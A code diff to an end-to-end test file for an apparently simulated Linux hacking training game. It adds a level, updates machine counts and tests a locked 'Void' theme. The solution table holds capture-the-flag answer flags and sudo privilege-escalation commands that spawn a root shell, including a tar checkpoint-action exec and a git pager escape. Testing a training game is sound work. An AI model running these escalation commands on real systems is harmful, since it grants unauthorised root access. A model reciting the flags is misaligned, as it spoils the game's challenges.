@@ -59,8 +59,12 @@ const SOLUTIONS = {
     },
     32: {
         flag: 'flag{tar_checkpoint_action_pwn}',
-        final: true,
         cmds: ['sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh']
+    },
+    33: {
+        flag: 'flag{git_pager_escape_pwn}',
+        final: true,
+        cmds: ['sudo git -p help !/bin/sh']
     },
 };
 
@@ -91,11 +95,11 @@ for (const [id, sol] of Object.entries(SOLUTIONS)) {
     });
 }
 
-test('hub renders 22 machines across 3 tiers', async ({ page }) => {
+test('hub renders 33 machines across 3 tiers', async ({ page }) => {
     await page.goto('/');
-    await expect(page.locator('.machine-card')).toHaveCount(27);
+    await expect(page.locator('.machine-card')).toHaveCount(33);
     await expect(page.locator('.home-tier-label')).toHaveCount(3);
-    await expect(page.locator('#homeProgressText')).toHaveText('0 / 22');
+    await expect(page.locator('#homeProgressText')).toHaveText('0 / 33');
 });
 
 test('pipes: cat | wc -l counts passwd lines', async ({ page }) => {
@@ -118,6 +122,17 @@ test('theme switch applies and persists across reload', async ({ page }) => {
     await page.reload();
     await expect(page.locator('html')).toHaveAttribute('data-theme', 'dracula');
     await expect(page.locator('[data-testid="home-theme-select"]')).toHaveValue('dracula');
+});
+
+test('void theme stays locked until Root Wizard is earned', async ({ page }) => {
+    await page.goto('/');
+    const voidOption = page.locator('[data-testid="home-theme-select"] option[value="void"]');
+    await expect(voidOption).toBeDisabled();
+    await expect(voidOption).toHaveText('🔒 Void');
+    // Selecting a disabled <option> is a no-op in every browser; confirm the
+    // theme genuinely didn't change rather than relying on that alone.
+    await page.selectOption('[data-testid="home-theme-select"]', 'kali').catch(() => {});
+    await expect(page.locator('html')).not.toHaveAttribute('data-theme', 'void');
 });
 
 test('blue team: harden box-01 after rooting', async ({ page }) => {
